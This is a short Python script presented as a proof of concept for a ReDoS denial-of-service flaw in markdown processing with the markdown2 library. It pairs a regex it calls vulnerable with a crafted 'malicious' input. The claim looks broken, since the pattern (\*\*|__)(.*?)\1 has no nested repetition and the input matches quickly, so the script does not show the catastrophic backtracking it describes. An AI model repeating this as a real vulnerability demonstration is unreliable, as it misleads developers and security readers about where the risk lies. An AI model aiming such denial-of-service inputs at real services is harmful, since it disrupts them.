import re
import markdown2

# Vulnerable function demonstrating the ReDoS vulnerability
def vulnerable_markdown_processing(input_string):
    # This regex can cause catastrophic backtracking
    regex = r"(\*\*|__)(.*?)\1"  # Vulnerable regex pattern
    if re.search(regex, input_string):
        return markdown2.markdown(input_string)
    return input_string

# Example of a malicious input that could exploit the vulnerability
malicious_string = "**" + "a" * 10000 + "**"
print(vulnerable_markdown_processing(malicious_string))